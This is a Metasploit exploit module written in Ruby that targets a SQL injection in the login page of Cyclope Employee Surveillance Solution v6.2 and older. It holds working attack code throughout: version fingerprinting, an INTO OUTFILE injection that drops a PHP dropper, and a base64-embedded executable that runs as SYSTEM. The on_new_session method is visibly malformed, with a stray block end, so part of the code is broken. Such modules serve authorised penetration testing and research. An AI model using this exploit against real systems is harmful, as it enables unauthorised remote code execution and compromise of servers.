# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Cyclope Employee Surveillance Solution v6 SQL Injection",
            &#039;Description&#039;    => %q{
                This module exploits a SQL injection found in Cyclope Employee Surveillance
                Solution.  Because the login script does not properly handle the user-supplied
                username parameter, a malicious user can manipulate the SQL query, and allows
                arbitrary code execution under the context of &#039;SYSTEM&#039;.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;loneferret&#039;, #Original discovery, PoC
                    &#039;sinn3r&#039;      #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;OSVDB&#039;, &#039;84517&#039;],
                    [&#039;EDB&#039;, &#039;20393&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00"
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [&#039;Cyclope Employee Surveillance Solution v6.2 or older&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Aug 8 2012",
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptPort.new(&#039;RPORT&#039;,     [true, "The web application&#039;s port", 7879]),
                    OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to to the web application&#039;, &#039;/&#039;])
                ], self.class)
    end
 
    def check
        peer = "#{rhost}:#{rport}"
        path = File.dirname("#{target_uri.path}/.")
        b64_version = get_version(path)
        if b64_version.empty?
            print_error("#{peer} - Unable to determine the version number")
        else
            b64_version = Rex::Text.decode_base64(b64_version)
            if b64_version =~ /^[0-6]\.1/
                return Exploit::CheckCode::Vulnerable
            else
                return Exploit::CheckCode::Safe
            end
        end
 
        return Exploit::CheckCode::Unknown
    end
 
 
    def get_version(path)
        res = send_request_raw({&#039;uri&#039;=> "#{path}index.php"})
        return &#039;&#039; if not res
 
        v = res.body.scan(/\<link rel\=\"stylesheet\" type\=\"text\/css\" href\=\"([\w\=]+)\/css\/.+\" \/\>/).flatten[0]
        return &#039;&#039; if not v
 
        return v
    end
 
 
    def on_new_session(cli)
            print_error("Please remember to manually remove #{@exe_fname} and #{@php_fname}")
            return
        end
 
        cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
 
        begin
            print_status("Deleting #{@php_fname}")
            cli.fs.file.rm(@php_fname)
        rescue ::Exception => e
            print_error("Please note: #{@php_fname} is stil on disk.")
        end
 
        begin
            print_status("Deleting #{@exe_fname}")
            cli.fs.file.rm(@exe_fname)
        rescue ::Exception => e
            print_error("Please note: #{@exe_fname} is still on disk.")
        end
    end
 
 
    def get_php_payload(fname)
        p = Rex::Text.encode_base64(generate_payload_exe)
        php = %Q|
        <?php
        $f = fopen("#{fname}", "wb");
        fwrite($f, base64_decode("#{p}"));
        fclose($f);
        exec("#{fname}");
        ?>
        |
        php = php.gsub(/^\t\t/, &#039;&#039;).gsub(/\n/, &#039; &#039;)
        return php
    end
 
 
    def exploit
        peer = "#{rhost}:#{rport}"
        path = File.dirname("#{target_uri.path}/.")
 
        #
        # Need to fingerprint the version number in Base64 for the payload path
        #
        b64_version = get_version(path)
        if b64_version.empty?
            print_error("#{peer} - Unable to determine the version number")
            return
        end
 
        print_status("#{peer} - Obtained version: #{Rex::Text.decode_base64(b64_version)}")
 
        #
        # Prepare our payload (naughty exe embedded in php)
        #
        @exe_fname = Rex::Text.rand_text_alpha(6) + &#039;.exe&#039;
        @php_fname = Rex::Text.rand_text_alpha(6) + &#039;.php&#039;
        php = get_php_payload(@exe_fname).unpack("H*")[0]
        sqli = "x&#039; or (SELECT 0x20 into outfile &#039;/Progra~1/Cyclope/#{b64_version}/#{@php_fname}&#039; LINES TERMINATED BY 0x#{php}) and &#039;1&#039;=&#039;1"
 
        #
        # Inject payload
        #
        print_status("#{peer} - Injecting PHP payload...")
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => path,
            &#039;vars_post&#039; => {
                &#039;act&#039; => &#039;auth-login&#039;,
                &#039;pag&#039; => &#039;login&#039;,
                &#039;username&#039; => sqli,
                &#039;password&#039; => Rex::Text.rand_text_alpha(5)
            }
        })
 
        #
        # Load our payload
        #
        print_status("#{peer} - Loading payload: #{path}#{b64_version}/#{@php_fname}")
        send_request_raw({&#039;uri&#039;=>"#{path}#{b64_version}/#{@php_fname}"})
        if res and res.code == 404
            print_error("#{peer} - Server returned 404, the upload attempt probably failed.")
            return
        end
 
        handler
    end
 
end



